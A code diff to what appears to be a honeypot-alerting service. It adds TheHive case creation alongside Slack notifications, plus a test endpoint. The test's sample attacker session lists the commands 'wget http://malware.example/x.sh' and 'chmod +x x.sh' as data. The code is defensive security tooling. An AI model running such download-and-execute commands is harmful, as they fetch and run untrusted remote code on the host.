@@ -20,6 +20,7 @@ from enrichment import enrich_ip
 from claude_client import triage_session
 from supabase_writer import upsert_session
 import slack_notify
+import thehive_client
 
 _STATE_FILE = Path(__file__).parent / ".state_since"
 
@@ -136,6 +137,10 @@ async def _process(s: dict) -> None:
 
     # SOAR tier 1: escalate high-notability attackers to Slack (no-op if unset).
     await slack_notify.notify(s, enr, summary, techniques, score)
+    # SOAR tier 2: open a TheHive case for the same (no-op if unset).
+    case_id = await thehive_client.create_case(s, enr, summary, techniques, score)
+    if case_id:
+        print(f"[thehive] opened case {case_id} for {ip}")
 
 
 async def _flush() -> None:
@@ -213,3 +218,17 @@ async def test_slack() -> dict:
         5,
     )
     return {"sent": bool(settings.slack_webhook_url), "threshold": settings.slack_notify_threshold}
+
+
+@app.post("/test-thehive")
+async def test_thehive() -> dict:
+    """Open a sample TheHive case to verify the wiring without waiting for a
+    real score-5 attacker."""
+    case_id = await thehive_client.create_case(
+        {"source_ip": "203.0.113.7", "commands_tried": ["uname -a", "wget http://malware.example/x.sh", "chmod +x x.sh"]},
+        {"country": "Testland", "asn": "AS0 Example", "abuseipdb_score": 100, "vt_malicious_count": 9},
+        "TEST CASE — simulated notable attack to confirm TheHive case creation is wired up.",
+        ["T1105: Ingress Tool Transfer", "T1059: Command and Scripting Interpreter"],
+        5,
+    )
+    return {"enabled": bool(settings.thehive_api_key), "case_id": case_id}
